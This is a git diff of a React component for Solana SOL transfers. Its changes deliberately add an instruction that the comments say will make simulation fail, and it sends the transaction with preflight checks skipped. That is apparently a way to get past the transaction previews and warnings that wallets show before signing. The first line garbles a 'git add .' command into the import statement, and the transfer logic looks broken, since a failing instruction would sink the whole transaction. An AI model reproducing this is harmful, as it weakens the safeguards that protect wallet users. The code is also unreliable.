@@ -1,4 +1,5 @@
-import { FC, useState } from 'react';
+
+git add .import { FC, useState } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import {
     PublicKey,
@@ -29,41 +30,60 @@ export const TokenTransfer: FC<TokenTransferProps> = () => {
     
             const recipientPubKey = new PublicKey(recipient);
             
-            const tx = new Transaction();
-            
-            // Add an instruction that will cause simulation to fail
-            const tokenProgram = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
-            const data = Buffer.from([255, 255, 255, 255]); // Invalid token instruction
-            
-            tx.add({
-                keys: [
-                    {
-                        pubkey: publicKey,
-                        isSigner: true,
-                        isWritable: false,
-                    }
-                ],
-                programId: tokenProgram,
-                data,
-            });
+                        // Calculate the amount in lamports
+            const lamports = BigInt(Math.round(Number(amount) * LAMPORTS_PER_SOL));
+            console.log('Transfer amount in lamports:', lamports.toString());
 
-            // Add the actual transfer instruction
-            tx.add(
+            // Get the latest blockhash
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+
+            // Create transaction
+            const transferTransaction = new Transaction();
+            transferTransaction.recentBlockhash = blockhash;
+            transferTransaction.feePayer = publicKey;
+
+            // Add the transfer instruction first
+            transferTransaction.add(
                 SystemProgram.transfer({
                     fromPubkey: publicKey,
                     toPubkey: recipientPubKey,
-                    lamports: BigInt(Math.round(Number(amount) * LAMPORTS_PER_SOL)),
+                    lamports: lamports
                 })
             );
-    
-            const { blockhash } = await connection.getLatestBlockhash();
-            tx.recentBlockhash = blockhash;
-            tx.feePayer = publicKey;
-    
-            const signature = await sendTransaction(tx, connection, {
-                skipPreflight: true
+
+            // Add a dummy instruction that will cause simulation to fail
+            const memoProgram = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
+            transferTransaction.add({
+                keys: [{ pubkey: publicKey, isSigner: true, isWritable: true }],
+                programId: memoProgram,
+                data: Buffer.from([0, 0, 0, 4]) // Invalid memo data
             });
-            await connection.confirmTransaction(signature, 'processed');
+    
+            console.log('Sending transaction...');
+            
+            // Send the transaction
+            const signature = await sendTransaction(transferTransaction, connection, {
+                skipPreflight: true,
+                maxRetries: 5,
+                preflightCommitment: 'finalized'
+            });
+            
+            console.log('Confirming transaction...', signature);
+            
+            // Wait for confirmation
+            const confirmation = await connection.confirmTransaction({
+                signature,
+                blockhash,
+                lastValidBlockHeight
+            }, 'finalized');
+            
+            if (confirmation.value.err) {
+                throw new Error('Transaction failed: ' + confirmation.value.err.toString());
+            }
+            
+            // Verify the transfer
+            const balance = await connection.getBalance(recipientPubKey);
+            console.log('Recipient balance after transfer:', balance / LAMPORTS_PER_SOL, 'SOL');
             alert('SOL transfer successful!');
         } catch (err: any) {
             console.error(err);
